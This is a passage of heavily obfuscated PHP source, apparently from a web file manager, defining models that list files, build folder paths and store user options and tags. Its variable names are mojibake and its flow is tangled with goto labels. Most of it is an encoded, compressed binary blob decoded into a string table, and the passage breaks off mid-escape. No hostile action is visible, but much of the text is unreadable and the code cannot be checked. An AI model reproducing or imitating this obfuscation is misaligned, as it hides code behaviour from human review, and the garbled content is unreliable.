$‡ß£ßÁ[$ëÙééë¢[562]]; $îÃà­•[$ëÙééë¢[566]] = $‡ß£ßÁ[$ëÙééë¢[567]]; $îÃà­•[$ëÙééë¢[568]] = $³‰¦«Öç . $‡ß£ßÁ[$ëÙééë¢[87]][$ëÙééë¢[181]]; } protected function _listAppendPath(&$ÃÓ¶œòÏ, $×Ğ”›ä = false) { $¤ÀÏòÉä =& $_SERVER[Ö†ØøÖ±]; static $×Ô±ğı = array(); $¢Å‰¢Ğ = array(); $şâå£ÎÚ = array(); if ($×Ğ”›ä) { return $×Ô±ğı; } foreach ($ÃÓ¶œòÏ as &$óÏÕ¦™) { $ËÌÀàÜ = $óÏÕ¦™[$¤ÀÏòÉä[181]]; if ($óÏÕ¦™[$¤ÀÏòÉä[462]] == $¤ÀÏòÉä[88] && $óÏÕ¦™[$¤ÀÏòÉä[180]] != 0) { $×Ô±ğı[$ËÌÀàÜ] = $óÏÕ¦™[$¤ÀÏòÉä[32]]; } if ($óÏÕ¦™[$¤ÀÏòÉä[462]] == $¤ÀÏòÉä[88] && $óÏÕ¦™[$¤ÀÏòÉä[180]] == 0) { $×Ô±ğı[$ËÌÀàÜ] = $this->_listAppendPathRoot($óÏÕ¦™, array()); } if (isset($şâå£ÎÚ[$óÏÕ¦™[$¤ÀÏòÉä[562]]])) { continue; } $şâå£ÎÚ[$óÏÕ¦™[$¤ÀÏòÉä[562]]] = !0; $ï£†èãï = $this->parentLevelArray($óÏÕ¦™[$¤ÀÏòÉä[562]]); foreach ($ï£†èãï as $ ëÆÀ¥Ê => $«íÔó‹±) { if (isset($×Ô±ğı[$«íÔó‹±])) { continue; } if ($ ëÆÀ¥Ê == 0) { $×Ô±ğı[$«íÔó‹±] = $this->_listAppendPathRoot($óÏÕ¦™, $ï£†èãï); } if ($ ëÆÀ¥Ê != 0) { $¢Å‰¢Ğ[] = $«íÔó‹±; } } } unset($óÏÕ¦™); $¢Å‰¢Ğ = array_unique($¢Å‰¢Ğ); if (count($¢Å‰¢Ğ) > 0) { $†‡³‹«Ï = array($¤ÀÏòÉä[468] => array($¤ÀÏòÉä[469], $¢Å‰¢Ğ)); if (count($¢Å‰¢Ğ) == 1) { $ÄçÂæô = $this->sourceInfo($¢Å‰¢Ğ[0]); $Ûäï«Šó = is_array($ÄçÂæô) ? array($ÄçÂæô) : !1; } else { $Ûäï«Šó = $this->field($¤ÀÏòÉä[569])->where($†‡³‹«Ï)->select(); } if (!$Ûäï«Šó) { $Ûäï«Šó = array(); } foreach ($Ûäï«Šó as $‘¹Ô—½) { $×Ô±ğı[$‘¹Ô—½[$¤ÀÏòÉä[181]]] = $‘¹Ô—½[$¤ÀÏòÉä[32]]; } } $¯šÉˆÄ¹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ËóŒ¼¯ = array(); foreach ($ÃÓ¶œòÏ as &$óÏÕ¦™) { $óüÍˆõª = $óÏÕ¦™[$¤ÀÏòÉä[562]]; $öº†—÷¡ = $¤ÀÏòÉä[12]; if (isset($ËóŒ¼¯[$óüÍˆõª])) { $öº†—÷¡ = $ËóŒ¼¯[$óüÍˆõª]; } else { $ï£†èãï = $this->parentLevelArray($óÏÕ¦™[$¤ÀÏòÉä[562]]); foreach ($ï£†èãï as $ ëÆÀ¥Ê => $«íÔó‹±) { if (isset($×Ô±ğı[$«íÔó‹±])) { $öº†—÷¡ .= $×Ô±ğı[$«íÔó‹±] . $¤ÀÏòÉä[8]; } } $ËóŒ¼¯[$óüÍˆõª] = $öº†—÷¡; } $öº†—÷¡ .= $óÏÕ¦™[$¤ÀÏòÉä[32]]; if ($óÏÕ¦™[$¤ÀÏòÉä[462]] == $¤ÀÏòÉä[88]) { $öº†—÷¡ .= $¤ÀÏòÉä[8]; } $óÏÕ¦™[$¤ÀÏòÉä[560]] = str_replace($¤ÀÏòÉä[570], $¤ÀÏòÉä[8], $öº†—÷¡); if ($óÏÕ¦™[$¤ÀÏòÉä[180]] == $¤ÀÏòÉä[212]) { $óÏÕ¦™[$¤ÀÏòÉä[32]] = trim($×Ô±ğı[$óÏÕ¦™[$¤ÀÏòÉä[181]]], $¤ÀÏòÉä[8]); $óÏÕ¦™[$¤ÀÏòÉä[560]] = $óÏÕ¦™[$¤ÀÏòÉä[32]] . $¤ÀÏòÉä[8]; } if (intval($óÏÕ¦™[$¤ÀÏòÉä[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($óÏÕ¦™, $ï£†èãï, $¯šÉˆÄ¹); } } unset($óÏÕ¦™); return $ÃÓ¶œòÏ; } private function _listAppendPathRecycle(&$¬ìêÚÏ, $ˆŠ®†É, $…ÔóáñÆ) { $“ÇâÊ›µ =& $_SERVER[Ö†ØøÖ±]; if (!in_array($…ÔóáñÆ, $ˆŠ®†É) && $¬ìêÚÏ[$“ÇâÊ›µ[181]] != $…ÔóáñÆ) { return; } $ù²äŞô = explode($“ÇâÊ›µ[8], trim($¬ìêÚÏ[$“ÇâÊ›µ[560]], $“ÇâÊ›µ[8])); $¶ıñÀŸ = implode($“ÇâÊ›µ[8], array_slice($ù²äŞô, 2)); $¬ìêÚÏ[$“ÇâÊ›µ[560]] = $“ÇâÊ›µ[8] . LNG($“ÇâÊ›µ[571]) . $“ÇâÊ›µ[8] . ltrim($¶ıñÀŸ, $“ÇâÊ›µ[8]); $¬ìêÚÏ[$“ÇâÊ›µ[562]] = $“ÇâÊ›µ[572] . implode($“ÇâÊ›µ[50], array_slice($ˆŠ®†É, 1)) . $“ÇâÊ›µ[50]; if ($¬ìêÚÏ[$“ÇâÊ›µ[181]] == $…ÔóáñÆ) { $¬ìêÚÏ[$“ÇâÊ›µ[562]] = $“ÇâÊ›µ[572]; $¬ìêÚÏ[$“ÇâÊ›µ[180]] = $“ÇâÊ›µ[212]; $¬ìêÚÏ[$“ÇâÊ›µ[32]] = LNG($“ÇâÊ›µ[571]); } $¬ìêÚÏ[$“ÇâÊ›µ[573]] = $“ÇâÊ›µ[574]; } protected function _listAppendPathRoot(&$ŸöÜîã, $¯À¶Õ¶) { $‡â†Ìúë =& $_SERVER[Ö†ØøÖ±]; static $ıÂú„œ = false; $°äßŒåÑ = $‡â†Ìúë[12]; if ($ŸöÜîã[$‡â†Ìúë[178]] == self::TYPE_USER) { if ($ŸöÜîã[$‡â†Ìúë[547]] == USER_ID) { $°äßŒåÑ = LNG($‡â†Ìúë[575]); if ($ıÂú„œ === !1) { $„°—Îâé = Model($‡â†Ìúë[576])->getInfoFull(USER_ID); $ıÂú„œ = _get($„°—Îâé, $‡â†Ìúë[577], $‡â†Ìúë[12]); } if ($¯À¶Õ¶ && $¯À¶Õ¶[0] == $ıÂú„œ || !$¯À¶Õ¶ && $ŸöÜîã[$‡â†Ìúë[181]] == $ıÂú„œ) { $°äßŒåÑ = LNG($‡â†Ìúë[578]); $ŸöÜîã[$‡â†Ìúë[579]] = $‡â†Ìúë[580]; } if (!$¯À¶Õ¶) { $ŸöÜîã[$‡â†Ìúë[32]] = $°äßŒåÑ; } } else { $ŸöÜîã[$‡â†Ìúë[581]] = Model($‡â†Ìúë[555])->getInfoSimpleOuter($ŸöÜîã[$‡â†Ìúë[547]]); $°äßŒåÑ = LNG($‡â†Ìúë[582]) . $‡â†Ìúë[163] . $ŸöÜîã[$‡â†Ìúë[581]][$‡â†Ìúë[32]] . $‡â†Ìúë[165]; } } else { if ($ŸöÜîã[$‡â†Ìúë[178]] == self::TYPE_GROUP) { $‰¼ŒƒÖ© = Model($‡â†Ìúë[563])->getInfoSimple($ŸöÜîã[$‡â†Ìúë[547]]); $°äßŒåÑ = $‰¼ŒƒÖ©[$‡â†Ìúë[32]]; } else { if ($ŸöÜîã[$‡â†Ìúë[178]] == self::TYPE_SYSTEM) { $°äßŒåÑ = $‡â†Ìúë[583]; } } } $°äßŒåÑ = $°äßŒåÑ ? $‡â†Ìúë[8] . $°äßŒåÑ . $‡â†Ìúë[8] : $‡â†Ìúë[8]; return $°äßŒåÑ; } protected function _listAppendUser(&$ˆí›ñˆ’) { $ÙÈß‰Ì› =& $_SERVER[Ö†ØøÖ±]; $¶ìö¾Á = array_to_keyvalue($ˆí›ñˆ’, $ÙÈß‰Ì›[12], $ÙÈß‰Ì›[504]); $Ÿ‡Ñïë† = array_to_keyvalue($ˆí›ñˆ’, $ÙÈß‰Ì›[12], $ÙÈß‰Ì›[506]); $Ò”¤À® = array_merge($¶ìö¾Á, $Ÿ‡Ñïë†); $êú¹¿Š = Model($ÙÈß‰Ì›[576])->userListInfo($Ò”¤À®); foreach ($ˆí›ñˆ’ as &$¥²úÈçÕ) { $ÈÃéÆ‹ = $¥²úÈçÕ[$ÙÈß‰Ì›[504]]; $¥²úÈçÕ[$ÙÈß‰Ì›[504]] = $êú¹¿Š[$ÈÃéÆ‹] ? $êú¹¿Š[$ÈÃéÆ‹] : !1; $ÈÃéÆ‹ = $¥²úÈçÕ[$ÙÈß‰Ì›[506]]; $¥²úÈçÕ[$ÙÈß‰Ì›[506]] = $êú¹¿Š[$ÈÃéÆ‹] ? $êú¹¿Š[$ÈÃéÆ‹] : !1; if (isset($¥²úÈçÕ[$ÙÈß‰Ì›[516]]) && $¥²úÈçÕ[$ÙÈß‰Ì›[516]][$ÙÈß‰Ì›[584]]) { $à†æµ²Ğ = $GLOBALS[$ÙÈß‰Ì›[6]][$ÙÈß‰Ì›[89]][$ÙÈß‰Ì›[585]]; if ($¥²úÈçÕ[$ÙÈß‰Ì›[516]][$ÙÈß‰Ì›[586]] <= time() - $à†æµ²Ğ) { $this->metaSet($¥²úÈçÕ[$ÙÈß‰Ì›[181]], $ÙÈß‰Ì›[584], null); $this->metaSet($¥²úÈçÕ[$ÙÈß‰Ì›[181]], $ÙÈß‰Ì›[586], null); unset($¥²úÈçÕ[$ÙÈß‰Ì›[516]][$ÙÈß‰Ì›[584]]); continue; } $«ÇœÕÀ› = $¥²úÈçÕ[$ÙÈß‰Ì›[516]][$ÙÈß‰Ì›[584]]; $¥²úÈçÕ[$ÙÈß‰Ì›[516]][$ÙÈß‰Ì›[587]] = Model($ÙÈß‰Ì›[576])->getInfoSimpleOuter($«ÇœÕÀ›); } } unset($¥²úÈçÕ); } public function parentLevelArray($¿ÍÀò—¾) { $¶“ã  =& $_SERVER[Ö†ØøÖ±]; $¿ÍÀò—¾ = explode($¶“ã [50], trim($¿ÍÀò—¾, $¶“ã [50])); return array_remove_value($¿ÍÀò—¾, $¶“ã [212]); } public function listAll($‰‰ÀÈôĞ) { $å›©™†Á =& $_SERVER[Ö†ØøÖ±]; $‘ªÃ¾‚ô = $this->sourceInfo($‰‰ÀÈôĞ); $ù•õ™Ö‰ = array($å›©™†Á[588] => array($å›©™†Á[589], $‘ªÃ¾‚ô[$å›©™†Á[562]] . $‰‰ÀÈôĞ . $å›©™†Á[590]), $å›©™†Á[591] => 0); $®ÏìòÔ = $å›©™†Á[592]; $‚úïší” = "\114\105\106\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\157\137\146\151\154\145\40\x66\x69\x6c\x65\40\157\x6e\40\163\157\x75\162\143\145\x2e\x66\151\154\x65\111\104\40\x3d\40\x66\151\x6c\x65\56\x66\x69\154\x65\111\104"; $Û›òÂ¥ş = $this->alias($å›©™†Á[496])->field($®ÏìòÔ)->where($ù•õ™Ö‰)->join($‚úïší”)->select(); $this->_listAppendAuth($Û›òÂ¥ş); $this->_listAppendUser($Û›òÂ¥ş); $this->_listAppendPath($Û›òÂ¥ş); $Û›òÂ¥ş = array_to_keyvalue($Û›òÂ¥ş, $å›©™†Á[181]); $©€ŸĞ¸‘ = "\x2f{$‘ªÃ¾‚ô[$å›©™†Á[32]]}\x2f"; $©€ŸĞ¸‘ = $©€ŸĞ¸‘ == $å›©™†Á[570] ? $å›©™†Á[8] : $©€ŸĞ¸‘; $ÆŸğÑ†Ÿ = array(); foreach ($Û›òÂ¥ş as $ÈÆîÕ” => $Îßí³Ì£) { $Õ–Ÿ‚Ã = $this->parentLevelArray($Îßí³Ì£[$å›©™†Á[562]]); array_shift($Õ–Ÿ‚Ã); $¨¤°‰ÁĞ = $©€ŸĞ¸‘; for ($Í¼€È¤« = 0; $Í¼€È¤« < count($Õ–Ÿ‚Ã); $Í¼€È¤«++) { $¨¤°‰ÁĞ .= $Û›òÂ¥ş[$Õ–Ÿ‚Ã[$Í¼€È¤«]][$å›©™†Á[32]] . $å›©™†Á[8]; } $¨¤°‰ÁĞ .= $Îßí³Ì£[$å›©™†Á[32]]; if ($Îßí³Ì£[$å›©™†Á[462]]) { $¨¤°‰ÁĞ .= $å›©™†Á[8]; } $÷÷ëÕ¤Ö = array($å›©™†Á[472] => str_replace($å›©™†Á[570], $å›©™†Á[8], str_replace($å›©™†Á[570], $å›©™†Á[8], str_replace($å›©™†Á[570], $å›©™†Á[8], $¨¤°‰ÁĞ))), $å›©™†Á[593] => intval($Îßí³Ì£[$å›©™†Á[462]]), $å›©™†Á[594] => intval($Îßí³Ì£[$å›©™†Á[76]]), $å›©™†Á[85] => intval($Îßí³Ì£[$å›©™†Á[85]]), $å›©™†Á[87] => $this->pathInfoFilter($Îßí³Ì£)); if (!$÷÷ëÕ¤Ö[$å›©™†Á[462]]) { $÷÷ëÕ¤Ö[$å›©™†Á[518]] = $Îßí³Ì£[$å›©™†Á[518]]; } $ÆŸğÑ†Ÿ[] = $÷÷ëÕ¤Ö; } $ÆŸğÑ†Ÿ = array_sort_by($ÆŸğÑ†Ÿ, $å›©™†Á[84]); return $ÆŸğÑ†Ÿ; } } goto d´ì¢»µë…; A„Äª­ë‰: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Œå´óÁ) { $ËÑùĞ’Í =& $_SERVER[Ö†ØøÖ±]; $„¨¼îìÔ = defined($ËÑùĞ’Í[2118]) && USER_ID ? USER_ID : $ËÑùĞ’Í[12]; return "\125\163\145\x72\117\160\x74\151\157\x6e\137{$Œå´óÁ}\x5f" . $„¨¼îìÔ; } protected function filterWhere($‚Â™í) { $œ€ê‡é³ =& $_SERVER[Ö†ØøÖ±]; $‚Â™í[$œ€ê‡é³[1699]] = defined($œ€ê‡é³[2118]) && USER_ID ? USER_ID : $œ€ê‡é³[12]; return $‚Â™í; } public function cacheRemoveUser($Ï¼¸¼‹¬, $£ûŒé–æ) { return Cache::remove("\x55\163\145\x72\117\160\x74\x69\x6f\x6e\137{$Ï¼¸¼‹¬}\137" . $£ûŒé–æ); } protected function optionDefault($í‡êåóø = '') { $Ì‘¨˜ÌÚ =& $_SERVER[Ö†ØøÖ±]; if ($í‡êåóø == $Ì‘¨˜ÌÚ[12]) { return $GLOBALS[$Ì‘¨˜ÌÚ[6]][$Ì‘¨˜ÌÚ[2394]]; } if ($í‡êåóø == $Ì‘¨˜ÌÚ[2395]) { return $GLOBALS[$Ì‘¨˜ÌÚ[6]][$Ì‘¨˜ÌÚ[2396]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\x74\x61\x67\114\x69\x73\x74"; public $modelType = "\125\163\x65\162\117\160\164\x69\157\x6e"; public $field = array("\156\x61\155\x65", "\163\x74\171\154\145", "\x73\157\x72\164"); public function listData($¬»Ÿ‘ú— = false, $Ÿ’üÔäØ = "\163\x6f\162\164", $ÄÖ­óÏÁ = false) { return parent::listData($¬»Ÿ‘ú—, $Ÿ’üÔäØ, $ÄÖ­óÏÁ); } public function remove($’¶ğëä‰) { return parent::remove($’¶ğëä‰); } public function add($¶û†Á‰û, $Ãß¡¤˜Ì = "\x6c\x61\x62\145\x6c\x2d\x67\162\145\x79\x2d\156\157\x72\x6d\x61\x6c") { $Á›ƒ‰ÔŞ =& $_SERVER[Ö†ØøÖ±]; if ($this->findByName($¶û†Á‰û)) { return !1; } $®¥ğüãİ = array($Á›ƒ‰ÔŞ[471] => $¶û†Á‰û, $Á›ƒ‰ÔŞ[535] => $Ãß¡¤˜Ì, $Á›ƒ‰ÔŞ[1901] => $this->getSort($Á›ƒ‰ÔŞ[311]) + 1); return parent::insert($®¥ğüãİ); } public function update($¦‹Í¹ÁÊ, $õŸ÷óº¬) { $›©Šà¨ü =& $_SERVER[Ö†ØøÖ±]; $ñˆ—é´… = $this->listData($¦‹Í¹ÁÊ); $º¶»ÑØ = $this->findByName($õŸ÷óº¬[$›©Šà¨ü[32]]); if (!$ñˆ—é´… || $º¶»ÑØ && $º¶»ÑØ[$›©Šà¨ü[451]] != $ñˆ—é´…[$›©Šà¨ü[451]]) { return !1; } return parent::update($¦‹Í¹ÁÊ, $õŸ÷óº¬); } public function moveTop($â·Ÿ Â€) { $ãš¢¢àø =& $_SERVER[Ö†ØøÖ±]; $²¦º¦‰° = parent::listData(); $²ÒàÌªÓ = $this->getSort($ãš¢¢àø[310]); foreach ($²¦º¦‰° as &$‹¶¢µ±„) { if ($‹¶¢µ±„[$ãš¢¢àø[451]] == $â·Ÿ Â€) { $‹¶¢µ±„[$ãš¢¢àø[1921]] = $²ÒàÌªÓ; continue; } $‹¶¢µ±„[$ãš¢¢àø[1921]] += 1; } unset($‹¶¢µ±„); return parent::resetData($²¦º¦‰°); } public function moveBottom($Â˜ôÁ²®) { $’­Éôáµ =& $_SERVER[Ö†ØøÖ±]; $ÈÀ½º = $this->getSort($’­Éôáµ[311]) + 1; return parent::update($Â˜ôÁ²®, array($’­Éôáµ[1921] => $ÈÀ½º)); } public function resetSort($òº®•”ƒ) { $Û…¸í’Ù =& $_SERVER[Ö†ØøÖ±]; $ÅÓàûóÈ = array(); $òº®•”ƒ = is_array($òº®•”ƒ) ? $òº®•”ƒ : array(); for ($ğÛÓøï¢ = 0; $ğÛÓøï¢ < count($òº®•”ƒ); $ğÛÓøï¢++) { $ÅÓàûóÈ[$òº®•”ƒ[$ğÛÓøï¢] . $Û…¸í’Ù[12]] = $ğÛÓøï¢ + 1; } $ûøŸÒÌÁ = parent::listData(); foreach ($ûøŸÒÌÁ as &$îéôĞüı) { $¡—÷ÁŸî = $ÅÓàûóÈ[$îéôĞüı[$Û…¸í’Ù[451]]]; $îéôĞüı[$Û…¸í’Ù[1921]] = $¡—÷ÁŸî ? $¡—÷ÁŸî : $îéôĞüı[$Û…¸í’Ù[1921]]; } unset($îéôĞüı); return parent::resetData($ûøŸÒÌÁ); } private function getSort($ÜĞ°æªû) { $åŸÀÚÅé =& $_SERVER[Ö†ØøÖ±]; $¼Ê›ï€¦ = parent::listData(); $ä•ö­³¬ = array_to_keyvalue($¼Ê›ï€¦, $åŸÀÚÅé[12], $åŸÀÚÅé[1921]); if (!$ä•ö­³¬) { $ä•ö­³¬ = array(0); } $ğ‡†°ÀÁ = $ÜĞ°æªû == $åŸÀÚÅé[311] ? max($ä•ö­³¬) : min($ä•ö­³¬); return intval($ğ‡†°ÀÁ); } } goto B²ó˜„ºº; d¡˜Ÿ—ÇºŸ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd6\x86\xd8\xf8\xd6\xb1", base64_decode('6Jb8qo+k')); $_SERVER[Ö†ØøÖ±] = explode("\174\4\174\5\174\4", gzinflate(substr(strrev('ÒFLÛœ’2Y¶Ël‚q;³¶-¶`í¬´-¥öP”(ÕÕx	}Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\x48\x1a\x5b\xd2\xc8\x9a\x91\xb7\x24\x65\x5f\x4a\x49\xd8\xf7\xad\x14\x68\x69\x59\x4b\xc3\x1a\xa0\x85\xb2\xb5\x5\xa\xb4\xa5\xd0\x42\xfb\x9a\x66\x61\xe7\x67\x2f\x2d\x3f\x7d\x77\x39\x77\x99\x91\xc"."\377\373\336\373\276\307\107\254\173\317\135\346\56\347\236\173\356\271\347\234\173\357\105\267\74\361\334\355\353\147\254\337\175\375\214\373\37\174\367\215\227\66\321\360\372\335\320\337\335".base64_decode('afg7399zF/LfN75/TkNDz/y9Z0f2PW/zbdrt2m3axmj4t0+H9nv21uXBHTf8dnLHrg==')."\xbb\x3c\x7c\xd1\xe8\x3\xad\x28\x33\x2d\xdb\x4a\x7f\x94\xa2\x69\x2b\xfa\x84\x61\xd9\x16\x5\xa4\xcc\x62\xc6\xc8\xd2\xb0\x51\xa4\xbf\x7e\xfa\xd3\x1f\xb\x97\xf5\x82\x69\xeb\x34\xea\xa3\x3f\x2a\xb4"."\x8b\xfc\xb5\x46\xf3\x6\x4b\x57\x23\xd1\x84\x1a\xef\xef\xeb\xb\xc6\x12\x90\xa9\x55\x4e\x2f\x98\x69\x8\x95\xb4\xb2\x56\x80\xef\x97\xf4\xb2\x85\x5a\x23\x57\xa7\x96\xcc\x92\x5e\x74\x40\x4\x20\xad"."\331\132\122\263\240\246\316\166\265\63\330\27\216\256\121\23\153\372\202\220\43\251\216\126\364\362\44\215\221\140\334\326\312\166\302\50\350\74\307\170\231\267\253\75\330\35\212\50\211"."\x58\x20\x12\xf\x74\x24\x42\xd1\x8\x5\x77\x44\x7b\x7b\x43\x89\x6a\x78\x2c\x1a\xe\xb7\x7\x3a\x56\x54\xa7\xf4\xc5\x2\xdd\xbd\x1\x5\xb5\x2f\xaf\xab\x46\x31\x63\x36\x28\x6b\x69\xca\x5a\xa5\x91"."\x6\xba\xc\x3d\x9f\xa6\xc1\xa2\xc6\x9a\x63\x4f\x96\x20\x94\xe0\x21\x34\x4d\xc5\x4a\x3e\x4f\x23\x11\x1e\x4a\xeb\x19\xad\x92\x87\xd1\xea\x94\x23\xa5\xb2\x51\xd0\x58\xa7\x57\xe8\x93\x1c\x4a\x3\x5a".strrev('º7AcõVV^¶Y ¡&^ÑbºT'."\r".'ÁBG`áƒÅU½hšÖÔpYv‚FŠb6Å').base64_decode('rZ70tV4BfImgoVAC4bAyXQ22XiixamiZGpVFY53BmNK+RhEjlDILBbPoQ7WgmbSlpg==').strrev('ÔÓ_øzßĞšWËLumäÎ–#§àdµ|w:yŠêí ÒxC‡z'."\0".'ğ1c')."\35\65\212\106\5\320\24\252\60\115\276\254\40\120\141\271\165\6\321\323\20\50\240\362\46\254\74\264\14\307\150\260\155\51\375\135\14\231\222\52\116\323\313\266\252\27\123\146\332"."\x28\xc2\x62\x5d\x6\x48\xa7\xd9\xb9\xce\xb2\x81\x32\xd0\x78\xc6\xcc\xa7\x59\xd8\x32\xa6\xa0\x2b\x19\x23\xaf\x47\x2a\x5\x39\xb\x8f\xa6\x72\x46\x3e\x5d\x66\xeb\xeb\x8b\x72\xd2\x68\x98\x2f\x57\x9c".strrev('¡vašï2õÇKSyKû0ÆÆumÖ'."\0".'ÍãAõ¡Jr•™j>¾pŞ±I™¥|%¨JÄW')."\x8a\xa2\x15\x5b\x6\x56\x48\xb6\x2e\xb3\x5c\xe8\x44\x94\x1\xbe\x8f\x56\x85\xd1\x5f\x23\x61\x84\xad\x8b\xb4\x34\x62\xfe\x86\x81\x53\xbc\x9f\xf\xd\x1c\x87\xfe\x34\x2\xe9\x1b\x84\x36\xe5\xf4\x7c"."\136\325\47\164\130\70\205\364\74\213\15\206\337\112\32\105\77\202\320\150\50\252\346\64\53\327\233\236\247\222\122\214\242\246\365\11\137\51\127\202\125\315\27\362\240\3\261\361\320"."\x45\x4c\x3b\x28\xd1\xe5\xbc\x99\xd2\xf2\x72\x17\x69\x38\x67\xdb\xa5\xb8\x5e\x4c\xe3\x91\x80\xae\x98\xe3\x45\x32\x52\x25\x5d\x87\x4c\x9d\x1e\x25\xad\xf4\x2a\x6b\x94\x9e\x56\xa3\xd5\x62\x5\xb\x79"."\36\142\275\343\60\213\3\355\11\66\235\351\14\15\44\331\266\120\7\37\64\54\102\341\304\362\324\112\245\274\221\322\154\303\54\372\315\224\255\333\136\313\56\353\32\324\30\110\245".base64_decode('dMvydphFu2zmvYF83hz3RstG1ii2KrOA2KJEtKi9mAC2wkqtW6xgxMGfmdVWsTPehQ==').strrev('«ÔQ¼Åòí¾¨ˆ)‡*ZÛfŠ­y¸i’¬4ëeTåAU£+7²ôeh­eÜòl')."\362\6\47\112\106\131\267\130\133\225\356\336\4\124\202\152\327\275\175\145\55\133\320\132\225\122\45\211\106\6\126\152\15\30\315\15\103\323\252\244\160\324\243\24\52\226\355\55\353"."\x88\x14\x19\x68\xbb\x83\x41\xe\x65\xbc\xbd\x78\x5d\x19\x7a\xda\x1b\x47\x14\x1b\xc0\x73\x9a\xe6\x2a\x8\x75\x14\x96\x46\xa1\x3d\x89\x44\x9f\x1a\xea\x42\x5b\x72\x24\xa8\xf6\x6\x12\x1d\x3d\xd0\x6c"."\x5b\xcb\xb2\x36\x87\x11\x1d\xe6\x55\x32\xe0\x6a\x2f\x5a\x5f\x18\xb9\x22\xa8\xaf\x2\xd8\x67\x8e\xeb\x65\xf4\xe1\xf6\xc9\x56\x65\xc4\x4c\x27\xcd\x9\x1f\x4b\xc2\x99\xe3\x88\xd0\xb0\xcc\x78\xba\x4b".strrev('®ÑãS2¶0xî¬sµ˜½a9ÖXÖ7¡–c=I}˜º}ÀÚ;UI¹n¶“’|x³¦7¶')."\xc4\xaa\x40\x2c\x8\x8b\xa\x21\xd2\x4\x6b\xd\xfe\x7a\xde\x1b\xd3\xd3\x68\x76\x52\x36\x2b\xa7\x95\xf0\xc0\xb2\x3c\x78\xfd\xe0\x8f\xb3\x54\xbc\xa6\x58\x5a\x38\xd4\x8d\xc7\xae\xd3\x6b\xa1\x4c\x5e"."\71\27\253\73\154\24\14\334\75\233\247\220\301\106\314\100\67\64\310\117\372\334\66\150\315\152\30\114\317\156\364\242\277\263\32\7\6\73\175\263\206\226\371\15\121\306\337\354\153".base64_decode('Vlqa5it9iDsxtLwCna7K0aREVziHRSB80SzqXzA4eHuTKINrWCkwFjy+PxhPqL3BRA==')."\x4f\xb4\x13\xbe\x1e\xc\x40\x28\x6c\xd2\x95\xcd\x7a\x3b\x40\x7f\x86\x0\x1\x86\xe8\x8f\x6a\x58\x5d\xd2\xce\x83\xa3\x9c\x42\xa9\x66\x72\x18\x4d\x46\xaf\xce\xc8\x30\xcc\x7c\xa8\xa0\x65\xa5\x7d\x40"."\x75\x6e\x13\x38\x86\x13\x7b\x5\x72\x20\x2c\x5b\x65\xa4\xf9\x3e\x82\xa2\x3d\xba\x91\xcd\xc1\x80\x19\xb8\xba\x94\x99\x37\xcb\x5a\x1e\x53\x4f\xb6\x70\x74\x46\xd1\xb2\x6\x50\xb4\x52\xbe\x82\x70\xc6"."\217\277\220\310\125\12\111\40\372\210\111\314\352\266\340\301\254\111\304\250\24\330\346\206\166\110\73\324\351\330\302\40\346\127\361\74\17\372\112\305\154\343\61\120\227\332\62\257\11"."\x3\x0\x45\xa1\x8b\x88\x19\x65\xcc\x85\x3c\x6\xbe\x94\x89\x16\x45\xaf\x36\xa2\xb7\xe2\x4e\x1\x89\x59\x4c\xa0\x2c\x22\xd1\x9e\xc5\x78\xbb\x68\x73\xaf\x29\x3c\x4f\x79\x5f\x1\x55\x42\xea\xec\x30".base64_decode('+QZH2f3Fzu1C0ctls3wU5CBhhew5eN6gcpvv4BZaPiycM/mOb5Yh1OqHfs9s6WL7oQ==')."\77\76\7\375\57\66\277\264\131\320\330\126\102\66\1\75\115\167\1\12\232\345\110\351\321\65\301\306\330\145\333\304\320\262\43\13\302\247\234\11\170\215\346\15\232\124\341\155\143"."\255\114\353\171\235\341\102\116\147\33\151\23\144\103\143\307\61\45\303\121\26\361\303\10\52\70\30\303\212\241\222\170\333\143\361\125\370\0\41\0\170\357\207\231\27\301\74\32\367".base64_decode('KMF9Ee8r6xkDyFURoWavVh5hHUMlxarBEWlFdfWHw2pHNJJA5w8KWRULJYJsBQc61Q==')."\100\107\37\215\161\236\204\320\340\352\15\226\102\306\132\140\222\121\43\374\202\23\100\233\132\311\54\132\272\67\5\45\304\351\244\52\51\55\66\112\240\263\142\163\165\355\227\23\136"."\xad\x30\xe5\x2d\x20\x12\xe0\xe5\xcd\x73\xb2\x29\xa\x6c\xa0\x94\xdb\x9\xc1\x34\x89\xfd\xf\xf\x1e\x5a\x85\x8c\x3f\xea\x8b\xc6\xa1\xc0\x32\xc\x45\x3c\x6a\x92\x2f\x96\xbe\x7e\x48\x2a\x48\x28\xd2".strrev('{ÆğèÓÛ×9Uf+Êöuå‚ò°ö±–—DÒ˜Ù(*»Û8ªÀÏ8'."\r".'9U€Şà')."\x2d\xf3\xe6\x53\xe8\x9a\x42\x7a\x30\xd1\x63\x58\x83\x27\xf0\x38\x8c\xdb\xb8\x35\x57\x2d\xeb\x88\x3c\xb0\x9a\x5b\x9a\x9a\xd9\xe2\x45\x8c\x86\xd4\x9e\x35\xde\x82\x17\xd7\x82\x87\xcc\xd7\xd4\xd4\xc4"."\xea\x9a\x3d\x5f\xc9\x21\xaa\x4\xe8\x6b\x16\xd3\x64\x5a\x60\xb0\x92\x95\xd4\x8\x5b\x21\x5a\x8a\xf1\x7c\xf8\x50\x6c\x79\xc7\xd\x46\x50\x8f\xe1\xec\xf1\x31\xd5\xe8\x72\x8c\x73\xeb\x80\x2a\x2a\x84"."\267\123\265\24\376\230\212\152\264\53\226\74\64\150\35\245\121\41\203\261\262\24\252\345\263\150\224\355\134\101\6\212\231\246\161\235\162\130\174\262\370\50\342\261\255\265\233\261\165"."\x8f\x98\xab\x49\xb6\x65\xd7\x6a\xc3\xea\x5a\x6d\x58\xed\x6a\xc3\xea\xea\x36\x50\x90\x65\x64\